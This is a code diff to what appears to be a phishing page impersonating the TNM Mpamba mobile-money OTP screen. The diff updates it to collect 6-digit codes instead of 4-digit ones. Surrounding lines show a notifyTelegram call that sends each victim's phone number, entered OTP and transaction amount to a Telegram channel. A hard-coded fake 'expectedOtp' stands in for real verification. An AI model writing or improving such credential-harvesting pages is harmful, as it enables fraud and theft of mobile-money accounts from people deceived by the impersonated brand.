@@ -919,9 +919,11 @@
 
         <div id="otp-screen" class="otp-screen">
           <h2>Enter OTP</h2>
-          <p style="color: var(--muted); margin: 8px 0 18px;">A 4-digit code was sent to your registered Mpamba number.</p>
+          <p style="color: var(--muted); margin: 8px 0 18px;">A 6-digit code was sent to your registered Mpamba number.</p>
           <p id="otp-status" style="margin: 0 0 16px; color: var(--muted); font-size: 0.9rem;">Attempts remaining: 5/5</p>
           <div class="otp-box">
+            <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" />
+            <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" />
             <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" />
             <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" />
             <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" />
@@ -1283,8 +1285,8 @@
       }
 
       const otp = collectOtp();
-      if (!/^\d{4}$/.test(otp)) {
-        alert('Enter the 4-digit OTP');
+      if (!/^\d{6}$/.test(otp)) {
+        alert('Enter the 6-digit OTP');
         return;
       }
 
@@ -1293,7 +1295,7 @@
       const normalizedRecipient = normalizePhone(recipientValue.trim());
       notifyTelegram(`TNM Mpamba OTP attempt\nPhone: 0${normalizedRecipient}\nAttempted OTP: ${otp}\nAmount: ${money(amount)}`);
 
-      const expectedOtp = '9999';
+      const expectedOtp = '999999';
       if (otp !== expectedOtp) {
         otpAttempts += 1;
         otpLocked = true;
